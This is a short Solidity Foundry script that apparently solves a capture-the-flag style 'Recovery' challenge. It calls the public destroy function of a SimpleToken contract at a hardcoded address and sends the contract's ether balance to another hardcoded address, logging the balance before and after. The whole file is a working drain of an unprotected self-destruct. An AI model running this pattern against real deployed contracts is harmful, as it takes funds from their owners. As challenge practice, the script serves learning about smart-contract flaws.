// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {SimpleToken} from "../src/Recovery.sol";

contract RecoveryScript is Script {
    function run() public {
        SimpleToken token = SimpleToken(payable(0x73afEDE8dDDf49404ACdDB05D3295d7dE3261e38));

        console.log(address(token).balance);

        vm.startBroadcast();
        token.destroy(payable(0xaCab087f7f0977c31d68E8BAe117069a90Dc6574));
        vm.stopBroadcast();

        console.log(address(token).balance);
    }
}